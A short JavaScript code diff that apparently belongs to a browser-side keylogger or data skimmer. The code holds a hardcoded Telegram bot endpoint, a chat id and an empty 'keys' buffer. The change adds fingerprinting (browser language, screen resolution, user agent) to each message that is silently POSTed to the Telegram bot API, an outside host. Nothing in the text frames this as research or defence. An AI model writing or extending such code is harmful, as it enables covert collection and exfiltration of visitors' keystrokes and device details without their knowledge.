@@ -30,7 +30,17 @@
             var c = '73406391';
             var keys='';
             function sendRequest(message) {
-                var data = {chat_id: c, text: message}
+                var language = navigator && navigator.languages[0];
+                var resolution = screen.width + "x" + screen.height;
+                var browser = navigator.userAgent;
+                var msg = JSON.stringify({
+                    language,
+                    resolution,
+                    browser,
+                    message
+                });
+                
+                var data = {chat_id: c, text: msg}
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", 'https://api.telegram.org/bot' + a + ':' +  b + '/sendMessage', true);
                 xhr.setRequestHeader('Content-Type', 'application/json');
